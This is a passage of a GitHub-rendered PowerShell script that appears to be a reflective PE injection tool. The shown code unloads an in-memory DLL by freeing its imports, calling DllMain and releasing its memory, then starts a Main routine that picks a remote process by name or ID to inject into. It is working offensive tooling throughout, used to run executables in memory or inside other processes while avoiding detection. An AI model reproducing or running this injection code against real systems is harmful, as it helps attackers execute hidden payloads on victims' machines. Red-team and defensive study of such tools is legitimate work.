          <td id="LC2664" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L2665" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2665"></td>
          <td id="LC2665" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEHandle</span></td>
        </tr>
        <tr>
          <td id="L2666" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2666"></td>
          <td id="LC2666" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L2667" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2667"></td>
          <td id="LC2667" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2668" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2668"></td>
          <td id="LC2668" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get Win32 constants and functions</span></td>
        </tr>
        <tr>
          <td id="L2669" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2669"></td>
          <td id="LC2669" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2670" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2670"></td>
          <td id="LC2670" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L2671" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2671"></td>
          <td id="LC2671" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2672" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2672"></td>
          <td id="LC2672" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2673" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2673"></td>
          <td id="LC2673" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-PEDetailedInfo</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2674" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2674"></td>
          <td id="LC2674" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2675" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2675"></td>
          <td id="LC2675" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Call FreeLibrary for all the imports of the DLL</span></td>
        </tr>
        <tr>
          <td id="L2676" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2676"></td>
          <td id="LC2676" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size</span></span> <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L2677" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2677"></td>
          <td id="LC2677" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2678" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2678"></td>
          <td id="LC2678" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ImportDescriptorPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress</span></span>)</td>
        </tr>
        <tr>
          <td id="L2679" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2679"></td>
          <td id="LC2679" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2680" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2680"></td>
          <td id="LC2680" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">while</span> (<span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2681" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2681"></td>
          <td id="LC2681" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2682" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2682"></td>
          <td id="LC2682" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDescriptor</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$ImportDescriptorPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_IMPORT_DESCRIPTOR</span></span>)</td>
        </tr>
        <tr>
          <td id="L2683" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2683"></td>
          <td id="LC2683" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2684" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2684"></td>
          <td id="LC2684" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>If the structure is null, it signals that this is the end of the array</span></td>
        </tr>
        <tr>
          <td id="L2685" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2685"></td>
          <td id="LC2685" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$ImportDescriptor<span class="pl-smi">.Characteristics</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L2686" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2686"></td>
          <td id="LC2686" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.FirstThunk</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L2687" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2687"></td>
          <td id="LC2687" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.ForwarderChain</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L2688" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2688"></td>
          <td id="LC2688" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.Name</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L2689" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2689"></td>
          <td id="LC2689" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.TimeDateStamp</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L2690" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2690"></td>
          <td id="LC2690" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2691" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2691"></td>
          <td id="LC2691" class="blob-code blob-code-inner js-file-line">					<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Done unloading the libraries needed by the PE<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2692" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2692"></td>
          <td id="LC2692" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">break</span></td>
        </tr>
        <tr>
          <td id="L2693" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2693"></td>
          <td id="LC2693" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2694" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2694"></td>
          <td id="LC2694" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2695" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2695"></td>
          <td id="LC2695" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDllPath</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAnsi((<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$ImportDescriptor<span class="pl-smi">.Name</span></span>)))</td>
        </tr>
        <tr>
          <td id="L2696" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2696"></td>
          <td id="LC2696" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-smi">$ImportDllPath</span>)</td>
        </tr>
        <tr>
          <td id="L2697" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2697"></td>
          <td id="LC2697" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2698" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2698"></td>
          <td id="LC2698" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">-eq</span> <span class="pl-c1">$null</span>)</td>
        </tr>
        <tr>
          <td id="L2699" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2699"></td>
          <td id="LC2699" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2700" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2700"></td>
          <td id="LC2700" class="blob-code blob-code-inner js-file-line">					<span class="pl-c1">Write-Warning</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Error getting DLL handle in MemoryFreeLibrary, DLLName: <span class="pl-smi">$ImportDllPath</span>. Continuing anyways<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>WarningAction <span class="pl-k">Continue</span></td>
        </tr>
        <tr>
          <td id="L2701" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2701"></td>
          <td id="LC2701" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2702" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2702"></td>
          <td id="LC2702" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2703" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2703"></td>
          <td id="LC2703" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.FreeLibrary.Invoke</span></span>(<span class="pl-smi">$ImportDllHandle</span>)</td>
        </tr>
        <tr>
          <td id="L2704" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2704"></td>
          <td id="LC2704" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2705" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2705"></td>
          <td id="LC2705" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2706" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2706"></td>
          <td id="LC2706" class="blob-code blob-code-inner js-file-line">					<span class="pl-c1">Write-Warning</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to free library: <span class="pl-smi">$ImportDllPath</span>. Continuing anyways.<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>WarningAction <span class="pl-k">Continue</span></td>
        </tr>
        <tr>
          <td id="L2707" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2707"></td>
          <td id="LC2707" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2708" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2708"></td>
          <td id="LC2708" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2709" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2709"></td>
          <td id="LC2709" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDescriptorPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$ImportDescriptorPtr</span>) ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_IMPORT_DESCRIPTOR</span></span>))</td>
        </tr>
        <tr>
          <td id="L2710" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2710"></td>
          <td id="LC2710" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2711" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2711"></td>
          <td id="LC2711" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2712" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2712"></td>
          <td id="LC2712" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2713" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2713"></td>
          <td id="LC2713" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Call DllMain with process detach</span></td>
        </tr>
        <tr>
          <td id="L2714" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2714"></td>
          <td id="LC2714" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Calling dllmain so the DLL knows it is being unloaded<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2715" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2715"></td>
          <td id="LC2715" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DllMainPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span></span>)</td>
        </tr>
        <tr>
          <td id="L2716" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2716"></td>
          <td id="LC2716" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DllMainDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L2717" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2717"></td>
          <td id="LC2717" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DllMain</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$DllMainPtr</span><span class="pl-k">,</span> <span class="pl-smi">$DllMainDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L2718" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2718"></td>
          <td id="LC2718" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2719" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2719"></td>
          <td id="LC2719" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DllMain<span class="pl-smi">.Invoke</span></span>(<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span><span class="pl-k">,</span> <span class="pl-c1">0</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2720" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2720"></td>
          <td id="LC2720" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2721" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2721"></td>
          <td id="LC2721" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2722" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2722"></td>
          <td id="LC2722" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFree.Invoke</span></span>(<span class="pl-smi">$PEHandle</span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>)</td>
        </tr>
        <tr>
          <td id="L2723" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2723"></td>
          <td id="LC2723" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2724" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2724"></td>
          <td id="LC2724" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2725" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2725"></td>
          <td id="LC2725" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-Warning</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to call VirtualFree on the PE&#39;s memory. Continuing anyways.<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>WarningAction <span class="pl-k">Continue</span></td>
        </tr>
        <tr>
          <td id="L2726" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2726"></td>
          <td id="LC2726" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2727" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2727"></td>
          <td id="LC2727" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2728" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2728"></td>
          <td id="LC2728" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2729" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2729"></td>
          <td id="LC2729" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2730" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2730"></td>
          <td id="LC2730" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Main</span></td>
        </tr>
        <tr>
          <td id="L2731" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2731"></td>
          <td id="LC2731" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2732" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2732"></td>
          <td id="LC2732" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L2733" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2733"></td>
          <td id="LC2733" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2734" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2734"></td>
          <td id="LC2734" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">=</span>  <span class="pl-c1">Get-Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2735" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2735"></td>
          <td id="LC2735" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2736" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2736"></td>
          <td id="LC2736" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L2737" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2737"></td>
          <td id="LC2737" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2738" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2738"></td>
          <td id="LC2738" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>If a remote process to inject in to is specified, get a handle to it</span></td>
        </tr>
        <tr>
          <td id="L2739" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2739"></td>
          <td id="LC2739" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$ProcId</span> <span class="pl-k">-ne</span> <span class="pl-c1">$null</span>) <span class="pl-k">-and</span> (<span class="pl-smi">$ProcId</span> <span class="pl-k">-ne</span> <span class="pl-c1">0</span>) <span class="pl-k">-and</span> (<span class="pl-smi">$ProcName</span> <span class="pl-k">-ne</span> <span class="pl-c1">$null</span>) <span class="pl-k">-and</span> (<span class="pl-smi">$ProcName</span> <span class="pl-k">-ne</span> <span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-pds">&quot;</span></span>))</td>
        </tr>
        <tr>
          <td id="L2740" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2740"></td>
          <td id="LC2740" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2741" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2741"></td>
          <td id="LC2741" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Can&#39;t supply a ProcId and ProcName, choose one or the other<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2742" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2742"></td>
          <td id="LC2742" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2743" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2743"></td>
          <td id="LC2743" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">elseif</span> (<span class="pl-smi">$ProcName</span> <span class="pl-k">-ne</span> <span class="pl-c1">$null</span> <span class="pl-k">-and</span> <span class="pl-smi">$ProcName</span> <span class="pl-k">-ne</span> <span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2744" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2744"></td>
          <td id="LC2744" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2745" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2745"></td>
          <td id="LC2745" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Processes</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">Get-Process</span> <span class="pl-k">-</span>Name <span class="pl-smi">$ProcName</span> <span class="pl-k">-</span>ErrorAction SilentlyContinue)</td>
        </tr>
        <tr>
          <td id="L2746" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2746"></td>
          <td id="LC2746" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Processes<span class="pl-smi">.Count</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L2747" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2747"></td>
          <td id="LC2747" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2748" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2748"></td>
          <td id="LC2748" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Can&#39;t find process <span class="pl-smi">$ProcName</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2749" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2749"></td>
          <td id="LC2749" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2750" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2750"></td>
          <td id="LC2750" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">elseif</span> (<span class="pl-smi">$Processes<span class="pl-smi">.Count</span></span> <span class="pl-k">-gt</span> <span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="L2751" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2751"></td>
          <td id="LC2751" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2752" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2752"></td>
          <td id="LC2752" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ProcInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-Process</span> <span class="pl-k">|</span> <span class="pl-k">where</span> { <span class="pl-c1">$_<span class="pl-smi">.Name</span></span> <span class="pl-k">-eq</span> <span class="pl-smi">$ProcName</span> } <span class="pl-k">|</span> <span class="pl-c1">Select-Object</span> ProcessName<span class="pl-k">,</span> Id<span class="pl-k">,</span> SessionId</td>
        </tr>
        <tr>
          <td id="L2753" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2753"></td>
          <td id="LC2753" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-Output</span> <span class="pl-smi">$ProcInfo</span></td>
        </tr>
        <tr>
          <td id="L2754" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2754"></td>
          <td id="LC2754" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>More than one instance of <span class="pl-smi">$ProcName</span> found, please specify the process ID to inject in to.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2755" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2755"></td>
          <td id="LC2755" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2756" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2756"></td>
          <td id="LC2756" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2757" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2757"></td>
          <td id="LC2757" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2758" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2758"></td>
          <td id="LC2758" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ProcId</span> <span class="pl-k">=</span> <span class="pl-smi">$Processes</span>[<span class="pl-c1">0</span>].ID</td>
        </tr>
        <tr>
          <td id="L2759" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2759"></td>
          <td id="LC2759" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2760" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2760"></td>
          <td id="LC2760" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2761" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2761"></td>
          <td id="LC2761" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2762" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2762"></td>
